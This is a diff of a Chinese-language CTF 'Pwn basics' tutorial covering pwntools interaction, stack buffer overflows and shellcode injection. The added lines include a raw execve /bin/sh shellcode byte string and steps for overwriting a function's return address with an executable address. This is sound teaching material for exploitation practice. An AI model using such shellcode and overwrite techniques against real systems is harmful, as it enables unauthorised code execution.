@@ -1,4 +1,4 @@
-
+# Pwb 基础
 ## Pwntools交互
 
 - 安装：
@@ -10,9 +10,9 @@
 	- `p = process(['nc','127.0.0.1','0721'])`
 - 设置环境
 	- `context.log_level = 'DEBUG'` 开启debug模式
-	- `context.arch = 'amd64'` 32位修改成别的
+	- `context.arch = 'amd64'` 32位修改成别的 (如 i386)
 - 发送
-	- `p.sendafter(b"what's your name: \n", b'Nimisora')` 需要时byte流形式
+	- `p.sendafter(b"what's your name: \n", b'Nimisora')` 需要时 byte 流形式
 - 暂停
 	- `pause()`
 - 交互模式
@@ -48,7 +48,7 @@ What's your name?Jack
 Hello, Jack!
 ```
 
-上面的编译选项中 `-g` 表示输出调试信息。
+!!! note "上面的编译选项中 `-g` 表示输出调试信息。"
 
 这段程序声明了一个长度为 64 的字节型数组，然后打印提示信息，再读取用户输入的名字，最后输出 Hello 和用户输入的名字。代码似乎没什么问题， name 数组 64 个字节应该是够了吧？毕竟没人的姓名会有 64 个字母，毕竟我们的内存空间也是有限的。
 
@@ -301,7 +301,7 @@ Hack![Inferior 1 (process 2711) exited normally]
 - （2）由于 shellcode 被加载到栈上的位置不是固定的，因此要求 shellcode 被加载到任意位置都能执行，也就是说 shellcode 中要使用 _**相对寻址**_ 。
 
 
-网上有非常多的shellcode可以参考使用，在这里可以直接使用pwntools自带的：
+网上有非常多的 shellcode 可以参考使用，在这里可以直接使用 pwntools 自带的：
 
 ```python
 from pwn import *
@@ -313,4 +313,20 @@ p.sendafter(b"what's your name: \n", sc.ljust(64, b"\x90"))
 # 向右补齐64位，按实际需求修改
 ```
 
+最短的 SHELLCODE 如下
+
+```python
+sc = (
+	b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+	b"\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+).ljust(length,b'\x90')
+```
+
+### 返回地址覆盖
+
+有的时候，题目给出的可读可写可执行的地址并不与接收输入的地址相连。这种情况，我们可以通过栈溢出用上述可执行地址覆盖该函数的 return 地址，使得执行 return 操作的时候执行上述地址上面的 shellcode
+
+使用 IDA 打开可执行文件，观察其栈分布情况，一般函数的 return 地址位于 `$rbp + 0x08` 处，而 main 函数的 `$rbp` 一般是 `0x00`
+
+如果可读可写可执行的地址为 `0x20000` 格式，那么我们传给文件的地址应该为： `p64(0x20000)` (如果是 32 位就用 `p32`)
 
